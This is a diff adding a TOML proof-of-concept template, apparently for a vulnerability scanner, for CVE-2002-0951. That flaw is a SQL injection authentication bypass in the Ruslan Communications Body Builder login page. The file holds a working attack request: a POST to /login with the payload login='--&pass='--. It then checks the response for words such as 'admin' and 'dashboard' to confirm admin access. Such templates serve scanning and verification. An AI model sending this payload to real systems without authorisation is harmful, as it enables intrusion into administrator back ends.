@@ -1,0 +1,34 @@
+[info]
+author = "AVE"
+description = "Ruslan Communications <Body>Builder 登录页面存在 SQL 注入漏洞，通过在用户名和密码字段中注入 '-- 序列可绕过身份认证，获取管理员后台访问权限。"
+id = "POC-AVE-2002-0487"
+name = "Ruslan Communications Body Builder 认证绕过 PoC"
+severity = "critical"
+tags = ["ave-2002-0487"]
+vuln_id = [
+    "CVE-2002-0951",
+    "AVE-2002-0487",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "login='--&pass='--"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "welcome",
+    "dashboard",
+    "管理",
+]
